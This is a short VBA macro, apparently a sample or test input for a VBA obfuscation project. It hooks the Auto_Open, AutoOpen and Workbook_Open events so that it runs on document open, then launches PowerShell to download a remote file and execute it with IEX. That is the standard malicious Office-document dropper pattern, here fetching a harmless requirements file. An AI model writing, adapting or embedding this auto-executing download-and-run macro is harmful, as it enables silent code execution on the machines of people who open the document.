Sub Auto_Open()
    Dim exec As String
    Dim testvar As String
    exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/bonnetn/vba-obfuscator/master/requirements.txt'))"""
    Shell (exec)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
